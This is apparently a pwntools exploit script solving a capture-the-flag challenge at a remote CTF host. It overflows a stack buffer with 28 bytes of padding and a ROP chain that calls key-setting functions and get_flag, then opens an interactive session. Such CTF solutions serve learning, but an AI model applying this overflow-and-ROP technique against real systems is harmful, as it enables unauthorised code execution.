from pwn import *

# p = process("./challenge")
p = remote("challenges.auctf.com", 30012)

def trigger():
    p.sendline("2")
    p.sendline("4")
    p.sendline("3")
    p.sendline("Stephen")

def exploit():
    #0x56559056 key1
    #0x56559057 key2
    #0x56559040 key3
    #0x56559058 key4
    binary = ELF("./challenge")
    base_pie = 0x56555000
    add_esp = base_pie + 0x0000101b                 # add esp, 8 ; pop ebx ; ret
    main = base_pie + binary.symbols['main']
    get_key1 = base_pie + binary.symbols['get_key1']
    get_key2 = base_pie + binary.symbols['get_key2']
    get_key3 = base_pie + binary.symbols['AAsDrwEk']
    get_flag = base_pie + binary.symbols['get_flag']
    get_key4 = base_pie + binary.symbols['set_key4']

    payload = ''
    payload += 'A' * 28
    payload += p32(get_key3)
    payload += p32(get_key2)
    payload += p32(get_key1)
    payload += p32(add_esp)
    payload += p32(0xfeedc0de)
    payload += 'JUNK'
    payload += p32(0)
    payload += p32(get_key4)
    payload += p32(get_flag)

    trigger()

    # gdb.attach(p, '''
    #             b *0x56556684
    #             b *0x56556787
    #             c
    #             ''')


    p.sendline(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()